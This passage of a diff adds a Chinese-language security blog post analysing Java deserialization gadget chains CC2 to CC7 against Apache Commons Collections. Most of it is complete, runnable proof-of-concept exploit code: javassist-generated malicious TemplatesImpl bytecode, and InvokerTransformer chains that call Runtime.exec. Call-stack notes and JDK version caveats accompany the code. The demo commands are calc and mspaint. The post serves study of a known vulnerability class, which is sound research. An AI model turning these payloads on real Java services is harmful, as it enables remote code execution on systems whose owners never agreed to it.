+        // 得到恶意类的字节码
+        byte[] evalByte = placeholder.toBytecode();
+
+        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
+        Class&lt;? extends TemplatesImpl&gt; clazz = templates.getClass();
+        // 将恶意字节码填充到TemplatesImpl对象中
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates,new byte[][]{evalByte});
+
+        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;p1n93r&quot;);
+
+        // 现在TemplatesImpl准备好了，需要一个类反序列化时触发：TemplatesImpl#newTransformer
+        // 使用PriorityQueue类反序列化触发
+        PriorityQueue&lt;Object&gt; res = new PriorityQueue&lt;&gt;(2);
+        // 为啥不在这个地方添加TemplatesImpl对象：因为add操作会触发比较，而TemplatesImpl没有实现Comparable接口
+        // 所以只能后面用反射进行添加了
+        res.add(1);
+        res.add(1);
+
+        // 现在将TransformingComparator和TemplatesImpl对象设置到PriorityQueue中，
+        // 使得PriorityQueue反序列化时调用TransformingComparator#tranformer(templatesImpl)，从而触发整个利用链
+        Class&lt;? extends PriorityQueue&gt; resClazz = res.getClass();
+
+        // 先构造一个TransformingComparator
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);
+        TransformingComparator newTransformerComparator = new TransformingComparator(invokerTransformer);
+        // 设置PriorityQueue的comparator
+        Field comparator = resClazz.getDeclaredField(&quot;comparator&quot;);
+        comparator.setAccessible(true);
+        comparator.set(res,newTransformerComparator);
+
+        // 然后将TemplatesImpl对象设置到PriorityQueue中
+        Field queue = resClazz.getDeclaredField(&quot;queue&quot;);
+        queue.setAccessible(true);
+        queue.set(res,new Object[]{templates,templates});
+</code></pre>
+<p>​
+return res;
+}</p>
+<pre><code>    public static void main(String[] args) throws Exception{
+        Object payload = getPayload();
+        SerialUtil.runPayload(payload);
+    }
+
+}
+</code></pre>
+<p>调用栈入下所示：</p>
+<p><img src="/media/2020-04-01-3.png" alt="CC2调用栈"></p>
+<p>最后的TemplatesImpl中的一些注意事项分析如下：</p>
+<p><img src="/media/2020-04-01-4.png" alt="CC2中TemplatesImpl一些分析"></p>
+<h3 id="cc3">CC3</h3>
+<p>POC入下所示：</p>
+<pre><code>package com.pinger.javasec.ysoserial;
+
+import com.pinger.javasec.util.SerialUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import javax.xml.transform.Templates;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @author : p1n93r
+ * @date : 2021/4/1 19:22
+ * CC3 Gadget分析
+ */
+public class CC3 {
+
+    /**
+     * 需要一个空类作为javassist的模板
+     */
+    public static class Placeholder {}
+
+    public static Object getPayload() throws Exception{
+        // 恶意的类需要继承此类，否则最终在TemplatesImpl#defineTransletClasses()会异常
+        String abstractTransletClassPath = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+
+        // 使用javassist生成一个恶意的类
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(CC3.Placeholder.class));
+        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));
+
+        CtClass placeholder = classPool.get(CC3.Placeholder.class.getName());
+        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
+        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
+        placeholder.makeClassInitializer().insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;mspaint\&quot;);&quot;);
+        placeholder.setName(&quot;EvalClass&quot;);
+        // 得到恶意类的字节码
+        byte[] evalByte = placeholder.toBytecode();
+
+        // 实例化TemplatesImpl对象,并将恶意字节码植入
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();
+        Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates,new byte[][]{evalByte});
+        Field name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;p1n93r&quot;);
+</code></pre>
+<p>​
+ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+new ConstantTransformer(1)
+});</p>
+<pre><code>        // 真正的RCE执行链，调用TrAXFilter构造器时，会调用TemplatesImpl#newTransformer()，之后就是和CC2一样了
+        Transformer[] trueTransformer = {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+        };
+
+        // 仍旧使用LazyMap即可
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+        Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+        // 创建AnnotationInvocationHandler对象，封装lazyMap
+        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);
+
+        // 得到代理Map
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
+
+        // 再次创建AnnotationInvocationHandler对象，封装proxyMap
+        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+        // 最后再将真正的transformer chain传入,防止反序列化之前在攻击机中就执行了命令
+        Class&lt;? extends Transformer&gt; chainClass = chainedTransformer.getClass();
+        Field iTransformers = chainClass.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,trueTransformer);
+        return res;
+    }
+
+    public static void main(String[] args)throws Exception {
+        Object payload = getPayload();
+        SerialUtil.runPayload(payload);
+    }
+}
+</code></pre>
+<p>调用栈如下所示：</p>
+<p><img src="/media/2020-04-01-5.png" alt="CC3调用栈"></p>
+<p>和CC1一样，利用了AnnotationInvocationHandler，所以需要JDK Version&lt;=JDK8u66。此外，此链中与CC2不同的是， <strong>利用InstantiateTransformer调用TrAXFilter的构造器，触发TemplatesImpl#newTransformer()</strong> 。</p>
+<h3 id="cc4">CC4</h3>
+<p>给出POC入下所示：</p>
+<pre><code>package com.pinger.javasec.ysoserial;
+
+import com.pinger.javasec.util.SerialUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import javax.xml.transform.Templates;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+/**
+ * @author : p1n93r
+ * @date : 2021/4/1 21:54
+ * CC4 Gadget研究
+ * 和CC2一样，就是将CC2中的InvokerTransformer换成ChainedTransformer
+ */
+public class CC4 {
+</code></pre>
+<p>​
+public static Object getPayload() throws Exception{
+String abstractTransletClassPath = &ldquo;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&rdquo;;</p>
+<pre><code>        // 使用javassist生成一个恶意的类
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(CC2.Placeholder.class));
+        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));
+
+        CtClass placeholder = classPool.get(CC2.Placeholder.class.getName());
+        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
+        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
+        placeholder.makeClassInitializer().insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;mspaint\&quot;);&quot;);
+        placeholder.setName(&quot;EvalClass&quot;);
+        // 得到恶意类的字节码
+        byte[] evalByte = placeholder.toBytecode();
+
+        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
+        Class&lt;? extends TemplatesImpl&gt; clazz = templates.getClass();
+        // 将恶意字节码填充到TemplatesImpl对象中
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates,new byte[][]{evalByte});
+
+        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;p1n93r&quot;);
+
+        // 现在TemplatesImpl准备好了，需要一个类反序列化时触发：TemplatesImpl#newTransformer
+        // 使用PriorityQueue类反序列化触发
+        PriorityQueue&lt;Object&gt; res = new PriorityQueue&lt;&gt;(2);
+        // 为啥不在这个地方添加TemplatesImpl对象：因为add操作会触发比较，而TemplatesImpl没有实现Comparable接口
+        // 所以只能后面用反射进行添加了
+        res.add(1);
+        res.add(1);
+
+        // 现在将TransformingComparator和TemplatesImpl对象设置到PriorityQueue中，
+        // 使得PriorityQueue反序列化时调用TransformingComparator#tranformer(chainedTransformer)，从而触发整个利用链
+        Class&lt;? extends PriorityQueue&gt; resClazz = res.getClass();
+
+        // 就是将CC2中的InvokerTransformer换成ChainedTransformer
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
+        });
+
+        // 设置PriorityQueue的comparator
+        Field comparator = resClazz.getDeclaredField(&quot;comparator&quot;);
+        comparator.setAccessible(true);
+        comparator.set(res,new TransformingComparator(chainedTransformer));
+
+        // 此时和CC2不同的是，不需要在PriorityQueue中添加TemplatesImpl对象了
+
+        return res;
+    }
+
+    public static void main(String[] args)throws Exception {
+        Object payload = getPayload();
+        SerialUtil.runPayload(payload);
+    }
+}
+</code></pre>
+<p>调用栈入下所示，和CC2差不多，就是换了个Transformer而已，需要CommonsCollection4依赖：</p>
+<p><img src="/media/2020-04-01-6.png" alt="CC4调用栈"></p>
+<h3 id="cc5">CC5</h3>
+<p>给出POC如下：</p>
+<pre><code>package com.pinger.javasec.ysoserial;
+
+import com.pinger.javasec.util.SerialUtil;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @author : p1n93r
+ * @date : 2021/4/1 22:514
+ * CC5 Gadget分析
+ * 和CC6类似，只不过最终TiedMapEntry不是放在HashMap和HashSet中,而是放在BadAttributeValueExpException
+ * 注意：仅支持JDK8u5-b01及以上的版本（低于这个版本没有实现readObject()方法）
+ */
+public class CC5 {
+
+    public static Object getPayload() throws Exception{
+        // 此时内部的Transformer是无效的，避免生成payload过程中提前执行
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(1)
+        });
+
+        // 真正的Transformer调用链
+        Transformer[] trueTransformer = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})
+        };
+
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+        Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(evalMap, &quot;test&quot;);
+
+        BadAttributeValueExpException res = new BadAttributeValueExpException(null);
+        Class&lt;? extends BadAttributeValueExpException&gt; clazz = res.getClass();
+        Field val = clazz.getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(res,tiedMapEntry);
+
+        // 最后记得将真正的Transformer链放入ChainedTransformer
+        Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+        Field iTransformers = chainedTransformerClass.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,trueTransformer);
+        return res;
+    }
+    
+    public static void main(String[] args)throws Exception {
+        Object payload = getPayload();
+        SerialUtil.runPayload(payload);
+    }
+}
+</code></pre>
+<p>调用栈入下所示，主要是BadAttributeValueExpException#readObject()会触发TiedMapEntry#toString()，而TiedMapEntry#toString()会触发TiedMapEntry#getValue()，最终触发LazyMap#get:</p>
+<p><img src="/media/2020-04-02-1.png" alt="CC5调用栈"></p>
+<p>下面看到BadAttributeValueExpException#readObject()，可以看到会调用valObj#toString()：</p>
+<pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    ObjectInputStream.GetField gf = ois.readFields();
+    Object valObj = gf.get(&quot;val&quot;, null);
+
+    if (valObj == null) {
+        val = null;
+    } else if (valObj instanceof String) {
+        val= valObj;
+    } else if (System.getSecurityManager() == null
+            || valObj instanceof Long
+            || valObj instanceof Integer
+            || valObj instanceof Float
+            || valObj instanceof Double
+            || valObj instanceof Byte
+            || valObj instanceof Short
+            || valObj instanceof Boolean) {
+        val = valObj.toString();
+    } else { // the serialized object is from a version without JDK-8019292 fix
+        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+    }
+}
+</code></pre>
+<h3 id="cc6">CC6</h3>
+<p>直接给出POC，如下所示：</p>
+<pre><code>public static Object getPayload() throws Exception{
+    // 真正的执行链
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+            new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,new Object[0]}),
+            new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;mspaint&quot;})
+    };
+
+
+    // 底层还是LazyMap触发Transformer链，先不放真正的Transformer，防止反序列化之前被触发
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+            new ConstantTransformer(1)
+    });
+
+    // 准备LazyMap，想办法触发LazyMap#get()
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+    Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+    TiedMapEntry tiedMapEntry = new TiedMapEntry(evalMap, &quot;test&quot;);
+
+    // 将TiedMapEntry作为key放入HashMap，HashMap#readObject会调用hash(key)，和URLDNS类似
+    HashMap&lt;Object, Object&gt; res = new HashMap&lt;&gt;();
+    res.put(tiedMapEntry,&quot;something&quot;);
+
+    // HashMap#put()也会调用hash(key)，所以最终经过LazyMap中的Transformer处理后，LazyMap会多一个键值对{&quot;test&quot;:1}
+    // 所以为了lazyMap#get()顺利执行factory.transform(key)，我们需要在反序列化前将键值对{&quot;test&quot;:1}去掉
+    evalMap.remove(&quot;test&quot;);
+
+    // 最后在chainedTransformer中填入真正的执行链
+    Class&lt;? extends ChainedTransformer&gt; clazz = chainedTransformer.getClass();
+    Field iTransformers = clazz.getDeclaredField(&quot;iTransformers&quot;);
+    iTransformers.setAccessible(true);
+    iTransformers.set(chainedTransformer,trueTransformer);
+
+    return res;
+}
+</code></pre>
+<p>调用链如下所示：</p>
+<p><img src="/media/2020-04-01-2.png" alt="CC6调用链"></p>
+<p>HashMap#readObject()中的hash(key)，前面URLDNS分析过了。重点是TiedMapEntry#hashCode()，如下代码所示：</p>
+<pre><code>public int hashCode() {
+    Object value = getValue();
+    return (getKey() == null ? 0 : getKey().hashCode()) ^
+           (value == null ? 0 : value.hashCode()); 
+}
+</code></pre>
+<p>再跟进TiedMapEntry#getValue()，如下代码所示：</p>
+<pre><code>public Object getValue() {
+    return map.get(key);
+}
+</code></pre>
+<p>于是顺利调用到了LazyMap#get()，从而触发Transformer达到RCE。</p>
+<p>ysoserial给出的链，不是利用HashMap，而是利用HashSet，猜测大佬可能就是纯粹为了炫技咩？？？ysoserial的操作就是对HashSet内部的HashMap进行底层操作，修改HashSet内部HashMap的key为TiedMapEntry而已，而且说实话整个操作不是很优雅，如果硬是要用HashSet，可以使用下面这个改版的：</p>
+<pre><code>public static Object getPayloadObjectFromYsoserail() throws Exception{
+    // 此时内部的Transformer是无效的，避免生成payload过程中提前执行
+    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+        new ConstantTransformer(1)
+    });
+
+    // 真正的Transformer调用链
+    Transformer[] trueTransformer = {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+            new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,new Object[0]}),
+            new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})
+    };
+
+    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+    Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+    TiedMapEntry tiedMapEntry = new TiedMapEntry(evalMap, &quot;test&quot;);
+    // 使用HashSet
+    HashSet&lt;Object&gt; res = new HashSet&lt;&gt;();
+    res.add(tiedMapEntry);
+
+    // 最后再将真正触发RCE的transformer设置到chainedTransformer中
+    Class&lt;? extends ChainedTransformer&gt; clazz = chainedTransformer.getClass();
+    Field iTransformers = clazz.getDeclaredField(&quot;iTransformers&quot;);
+    iTransformers.setAccessible(true);
+    iTransformers.set(chainedTransformer,trueTransformer);
+
+    // 因为HashSet#add()会执行hashMap#put()，最终会触发LazyMap#get()，导致LazyMap生成键值对{&quot;test&quot;:1}，所以需要remove掉
+    evalMap.remove(&quot;test&quot;);
+    return res;
+}
+</code></pre>
+<p>调用链如下，可以看到，并不是最优的：</p>
+<pre><code>Gadget chain:
+    java.io.ObjectInputStream.readObject()
+        java.util.HashSet.readObject()
+            java.util.HashMap.put()
+            java.util.HashMap.hash()
+                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                    org.apache.commons.collections.map.LazyMap.get()
+                        org.apache.commons.collections.functors.ChainedTransformer.transform()
+                        org.apache.commons.collections.functors.InvokerTransformer.transform()
+                        java.lang.reflect.Method.invoke()
+                            java.lang.Runtime.exec()
+</code></pre>
+<h3 id="cc7">CC7</h3>
+<p>给出POC如下所示：</p>
+<pre><code>package com.pinger.javasec.ysoserial;
+
+import com.pinger.javasec.util.SerialUtil;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @author : p1n93r
+ * @date : 2021/4/2 17:28
+ * CC7 Gadget研究
+ * 底层也是LazyMap，只不过现在是利用HashTable的hash碰撞触发HashMap#hash(TiedMapEntry)
+ * 然后调用TiedMapEntry#hashCode()，进而触发TiedMapEntry#getValue()--&gt;LazyMap#get()
+ */
+public class CC7 {
+
+    public static Object getPayload() throws Exception{
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(1)
+        });
+
+        Transformer[] trueTransformer = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;mspaint&quot;})
+        };
+
+        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();
+
+        // 让两个LazyMap的hashcode相同，于是HashTable反序列化时，会出现hash碰撞
+        // 且key不能一样，否则LazyMap.get(key)中不会触发transformer
+        hashMap1.put(&quot;p1n93r&quot;,1);
+        hashMap2.put(&quot;p1n93s&quot;,6);
+
+        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
+        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
+
+        // 使用HashTable和HashMap都一样，只要产生hash碰撞即可
+        HashMap&lt;Object, Object&gt; res = new HashMap&lt;&gt;();
+        res.put(lazyMap1,1);
+        res.put(lazyMap2,2);
+
+        // 最后记得把真正的执行链放入chainedTransformer
+        Class&lt;? extends ChainedTransformer&gt; chainedTransformerClass = chainedTransformer.getClass();
+        Field iTransformers = chainedTransformerClass.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,trueTransformer);
+
+        // 因为HashMap#put时就发生了hash碰撞，所以导致LazyMap1内部新增了一个键值对：{&quot;p1n93s&quot;,1}
+        // 需要删除，防止反序列化时LazyMap1#get(&quot;p1n93s&quot;)中不会进入transformer
+        lazyMap1.remove(&quot;p1n93s&quot;);
+
+        return res;
+    }
+</code></pre>
+<p>​
+public static void main(String[] args) throws Exception{
+Object payload = getPayload();
+SerialUtil.runPayload(payload);
+}
+}</p>
+<p>调用栈如下所示：</p>
+<p><img src="/media/2020-04-02-2.png" alt="CC7调用栈"></p>
+<p>核心思想其实就是，HashMap#readObject()中元素的key发生Hash碰撞时，会进行元素值比较，需要获取元素值嘛，肯定是通过get()获取嘛，这不就触发了LazyMap#get()了~最终触发LazyMap#get()，是在AbstractMap#equals()中，如下所示：</p>
+<p><img src="/media/2020-04-02-3.png" alt="CC7一些说明"></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-02-02
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/security/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">第三章：隐藏通信隧道技术</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/security/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+            <span class="next-text nav-default">第二章：内网信息收集</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
